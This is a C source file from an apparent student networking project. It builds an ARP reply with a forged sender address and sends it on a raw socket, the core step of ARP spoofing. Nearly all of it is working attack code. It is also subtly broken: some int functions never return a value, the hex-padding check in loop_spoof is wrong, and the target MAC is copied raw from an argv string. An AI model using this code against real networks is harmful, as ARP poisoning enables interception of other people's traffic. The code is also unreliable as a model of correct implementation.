/*
** EPITECH PROJECT, 2018
** NWP_myarpspoof_2018
** File description:
** print_spoof.c
*/

#include "arpspoofing.h"

int init_arph2(arp_t *arp)
{
    arp->socket_address.sll_family = AF_PACKET;
    arp->socket_address.sll_protocol = htons(ETH_P_ARP);
    arp->socket_address.sll_ifindex = arp->ifindex;
    arp->socket_address.sll_hatype = htons(ARPHRD_ETHER);
    arp->socket_address.sll_pkttype = (PACKET_BROADCAST);
    arp->socket_address.sll_halen = MAC_LEN;
    arp->socket_address.sll_addr[6] = 0x00;
    arp->socket_address.sll_addr[7] = 0x00;
}

int set_header2(arp_t *arp, struct ethhdr *send_req,
    arphdr_t *arp_req, char **av)
{
    memset(arp->buffer, 0, sizeof(arp->buffer));
    memcpy(send_req->h_dest, av[5], MAC_LEN);
    memcpy(arp_req->dest_mac, av[5], MAC_LEN);
    memcpy(send_req->h_source, arp->mac, MAC_LEN);
    memcpy(arp_req->src_mac, arp->mac, MAC_LEN);
    memcpy(arp->socket_address.sll_addr, arp->mac, MAC_LEN);
}

int init_req2(struct ethhdr *send_req, arphdr_t *arp_req)
{
    send_req->h_proto = htons(ETH_P_ARP);
    arp_req->hardware_type = htons(HW_TYPE);
    arp_req->protocol_type = htons(ETH_P_IP);
    arp_req->hardware_len = MAC_LEN;
    arp_req->protocol_len = IPV4_LEN;
    arp_req->opcode = htons(ARP_REPLY);
}

int loop_spoof(arp_t *arp)
{
    int i = 0;

    while (i < 42) {
        if ((arp->buffer[i] & 0xff) >= 0 && (arp->buffer[i] & 0xff) <= 8)
            printf("0");
        printf("%x", arp->buffer[i] & 0xff);
        if (i < 41)
            printf(" ");
        i++;
    }
    printf("\n");
}

int print_spoof(char **av)
{
    arp_t *arp = init_arp(av);
    struct ethhdr *send_req = (struct ethhdr *)arp->buffer;
    arphdr_t *arp_req = (arphdr_t *)(arp->buffer + ETH2_LEN);
    arp->fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    ifr_getter(arp);
    init_arph2(arp);
    set_header2(arp, send_req, arp_req, av);
    init_req2(send_req, arp_req);

    memcpy(arp_req->src_ip, &arp->src, sizeof(uint32_t));
    memcpy(arp_req->dest_ip, &arp->dst, sizeof(uint32_t));

    arp->ret = sendto(arp->fd, arp->buffer, 42, 0,
        (struct sockaddr *)&arp->socket_address, sizeof(arp->socket_address));
    if (arp->ret == -1)
        error("Sendto failed");

    loop_spoof(arp);
    return (0);
}